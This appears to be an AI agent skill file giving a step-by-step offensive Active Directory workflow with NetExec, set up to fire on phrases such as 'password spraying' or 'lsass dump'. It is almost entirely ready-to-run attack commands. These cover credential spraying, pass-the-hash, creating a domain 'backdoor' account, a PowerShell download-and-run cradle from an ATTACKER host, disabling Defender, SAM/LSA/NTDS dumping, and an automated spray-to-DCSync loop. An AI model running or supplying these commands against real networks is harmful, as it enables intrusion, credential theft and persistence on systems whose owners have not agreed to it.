---
name: ad-netexec
description: "NetExec (CrackMapExec) complete workflow. SMB/WinRM/LDAP/MSSQL enumeration, credential spraying, code execution, credential dumping, lateral movement. Triggers: 'netexec', 'nxc', 'crackmapexec', 'cme', 'smb enumeration', 'password spraying', 'sam dump', 'lsass dump', 'lateral movement smb', 'winrm exploit', 'smb shares enum'."
---

# NetExec — Complete Workflow

Successor to CrackMapExec. Credential validation, lateral movement, and post-exploitation across SMB, WinRM, LDAP, MSSQL, SSH, RDP.

## Install

```bash
pip install netexec --break-system-packages
# OR:
sudo apt-get install -y netexec
nxc --version
```

---

## Phase 1: Host Discovery & SMB Enumeration

```bash
# Discover live hosts + find no-signing targets (relay candidates):
nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

# Single host details (OS, hostname, SMB version, signing):
nxc smb 10.10.10.1

# Output:
# SMB 10.10.10.1 445 DC01 [*] Windows Server 2019 (signing:True) (SMBv1:False)
```

---

## Phase 2: Credential Validation & Spraying

```bash
# Test single credential:
nxc smb 10.10.10.1 -u 'administrator' -p 'Password123!'
nxc smb 10.10.10.1 -u 'administrator' -H 'NTHASH'   # pass-the-hash

# Password spray (one password, many users — check lockout policy first!):
nxc smb 10.10.10.0/24 -u users.txt -p 'Password123!' --continue-on-success
nxc smb 10.10.10.0/24 -u users.txt -p 'Password123!' --no-bruteforce

# Domain auth:
nxc smb 10.10.10.0/24 -u 'user' -p 'pass' -d 'CORP.LOCAL'

# Local account (workstations with reused local admin password):
nxc smb 10.10.10.1 -u 'localadmin' -p 'password' --local-auth

# Null session / guest:
nxc smb 10.10.10.1 -u '' -p ''
nxc smb 10.10.10.1 -u 'guest' -p ''

# Result markers:
# [+]  = valid credentials
# (Pwn3d!) = local admin on that host
```

---

## Phase 3: Enumeration (Authenticated)

```bash
CREDS="-u 'user' -p 'password' -d 'CORP.LOCAL'"

nxc smb 10.10.10.1 $CREDS --shares          # list SMB shares
nxc smb 10.10.10.1 $CREDS --sessions        # logged-in users
nxc smb 10.10.10.1 $CREDS --local-groups    # local groups
nxc smb 10.10.10.1 $CREDS --groups          # domain groups
nxc smb 10.10.10.1 $CREDS --users           # domain users
nxc smb 10.10.10.1 $CREDS --pass-pol        # password policy (lockout threshold)

# Find readable/writable shares:
nxc smb 10.10.10.1 $CREDS --shares --filter-shares READ WRITE

# Recursive file listing:
nxc smb 10.10.10.1 $CREDS -M spider_plus -o SHARE=share_name
nxc smb 10.10.10.1 $CREDS -M spider_plus -o PATTERN='password,cred,secret,config'
```

---

## Phase 4: Code Execution

```bash
CREDS="-u 'administrator' -p 'password' -d 'CORP.LOCAL'"

# Execute command:
nxc smb 10.10.10.1 $CREDS -x "whoami"
nxc smb 10.10.10.1 $CREDS -x "whoami /all"
nxc smb 10.10.10.1 $CREDS -X "Get-Process | Select -First 5"   # PowerShell

# Exec method options:
nxc smb 10.10.10.1 $CREDS -x "whoami" --exec-method wmiexec   # default, quieter
nxc smb 10.10.10.1 $CREDS -x "whoami" --exec-method smbexec
nxc smb 10.10.10.1 $CREDS -x "whoami" --exec-method atexec

# Execute on all Pwn3d hosts:
nxc smb 10.10.10.0/24 $CREDS -x "net user backdoor P@ssw0rd /add /domain"

# Reverse shell:
nxc smb 10.10.10.1 $CREDS -X "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"

# Disable Defender:
nxc smb 10.10.10.1 $CREDS -X "Set-MpPreference -DisableRealtimeMonitoring \$true"
```

---

## Phase 5: Credential Dumping

```bash
CREDS="-u 'administrator' -p 'password' -d 'CORP.LOCAL'"

nxc smb 10.10.10.1  $CREDS --sam         # local account hashes
nxc smb 10.10.10.1  $CREDS --lsa         # LSASS (domain creds in memory)
nxc smb <DC_IP>     $CREDS --ntds        # full NTDS dump (requires DA/DCSync)
nxc smb <DC_IP>     $CREDS --ntds --users administrator  # specific user

# DPAPI (browser/credential manager secrets):
nxc smb 10.10.10.1  $CREDS -M dpapi

# LAPS (local admin passwords from AD):
nxc ldap <DC_IP>    $CREDS -M laps

# GMSA (Group Managed Service Account passwords):
nxc ldap <DC_IP>    $CREDS -M gmsa
```

---

## Phase 6: WinRM

```bash
# WinRM (port 5985/5986 — PowerShell Remoting)
nxc winrm 10.10.10.1 -u 'user' -p 'password' -d 'CORP.LOCAL'
nxc winrm 10.10.10.1 -u 'user' -p 'password' -x "whoami"
nxc winrm 10.10.10.0/24 -u 'administrator' -p 'Password123!'
```

---

## Phase 7: LDAP

```bash
DC=<DC_IP>
CREDS="-u 'user' -p 'password' -d 'CORP.LOCAL'"

nxc ldap $DC $CREDS -M kerberoasting        # Kerberoastable accounts
nxc ldap $DC $CREDS -M asreproast           # AS-REP roastable
nxc ldap $DC $CREDS --users                 # all domain users
nxc ldap $DC $CREDS --groups                # domain groups
nxc ldap $DC $CREDS --trusted-for-delegation
nxc ldap $DC $CREDS --password-not-required
```

---

## Phase 8: MSSQL

```bash
nxc mssql 10.10.10.1 -u 'sa' -p 'password' -d 'CORP.LOCAL'
nxc mssql 10.10.10.1 -u 'sa' -p 'password' -x "whoami"   # via xp_cmdshell

# Enable xp_cmdshell if disabled:
nxc mssql 10.10.10.1 -u 'sa' -p 'password' \
  -q "EXEC sp_configure 'show advanced options',1; RECONFIGURE; \
      EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
```

---

## Phase 9: GPP Credentials

```bash
CREDS="-u 'user' -p 'password'"

# Group Policy Preferences plaintext passwords (still common):
nxc smb <DC_IP> $CREDS -M gpp_password
nxc smb <DC_IP> $CREDS -M gpp_autologin

# Zerologon check:
nxc smb 10.10.10.0/24 $CREDS -M zerologon

# EternalBlue check:
nxc smb 10.10.10.0/24 $CREDS -M ms17-010
```

---

## Phase 10: File Operations

```bash
CREDS="-u 'admin' -p 'password'"

# Download file:
nxc smb 10.10.10.1 $CREDS --get-file 'C:\Users\admin\passwords.txt' ./passwords.txt

# Upload file:
nxc smb 10.10.10.1 $CREDS --put-file ./tool.exe 'C:\Windows\Temp\tool.exe'
```

---

## Full Automation Chain

```bash
# 1. Spray → find valid creds
nxc smb 10.10.10.0/24 -u users.txt -p 'Pass1234!' --continue-on-success > spray.txt

# 2. Find Pwn3d hosts (local admin)
PWNED=$(grep "Pwn3d!" spray.txt | awk '{print $3}')

# 3. Dump SAM/LSA on all Pwn3d hosts
for ip in $PWNED; do
  echo "=== $ip ==="
  nxc smb $ip -u admin -p 'Pass1234!' --sam --lsa 2>/dev/null
done

# 4. DCSync when DA reached
nxc smb <DC_IP> -u admin -p 'Pass1234!' --ntds
```

---

## Output

Save to `.omop/engagement/ad/netexec/`:
- `spray_results.txt` — spray results
- `pwned_hosts.txt` — Pwn3d! hosts
- `sam_dumps/` — SAM hashes per host
- `ntds_dump.txt` — full domain hash dump

## Next Phase

→ `ad-attacks` for Kerberoasting / Golden Ticket with obtained creds
→ `red-lateral` for BloodHound attack path
→ `red-persistence` for establishing persistence
